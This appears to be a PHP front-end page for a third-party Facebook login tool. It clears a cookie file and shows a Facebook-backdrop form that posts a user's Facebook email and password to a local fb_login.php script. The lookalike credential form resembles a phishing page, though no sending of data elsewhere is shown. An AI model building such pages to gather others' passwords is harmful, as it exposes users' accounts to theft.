<?php

unlink('mirazmac_cookie.txt');
      //echo '<div align="right">';
      //echo '<form action="fb_login.php" method="post">';
      //echo '<font style="font-family:arial; font-size:9px;">Email or Phone </font><input type="text" name="user" style="font-family:arial; font-size:9px; width: 200px; margin-left: 0px; margin-top: 10px;">';
      //echo '<font style="font-family:arial; font-size:9px;">   Password </font><input type="password" name="password" style="font-family:arial; font-size:9px; width: 200px; margin-left: 0px; margin-top: 10px;">';
      //echo '<input type="submit" value="Log In" style="font-family:arial; font-size:9px; margin-left: 10px; margin-top: 10px;">';
      //echo '</form>'; 
      //echo '</div>';
?>
<style>
html { 
  background: url("facebook.png") no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}
div.transbox {
  margin: 30px;
  width: 400px;
  height: 300px;
  border: 1px solid black;
  background-color: rgba(255,255,255,.5);
  position: absolute;
  left: 65%;
}
</style>

<div class="transbox">
<div class="dentro">
  <form action="fb_login.php" method="post">
      <table>
      <tr valign="bottom">
      <td><font style="font-family:arial; font-size:11px;">Email or Phone </font></td>
      <td><input type="text" name="user" style="font-family:arial; font-size:11px; width: 180px; margin-left: 0px; margin-top: 10px;"></td>
      </tr>
      <tr valign="bottom">
      <td><font style="font-family:arial; font-size:9px;">Password </font></td>
      <td><input type="password" name="password" style="font-family:arial; font-size:9px; width: 180px; margin-left: 0px; margin-top: 10px;"></td>
      </tr>
      <tr valign="bottom" valign="left">
      <td></td>
      <td><input type="image" src="fb.png" style="width:200px;height:75px;"></td>
      </tr>
      </table>
  </form>
</div>
</div>




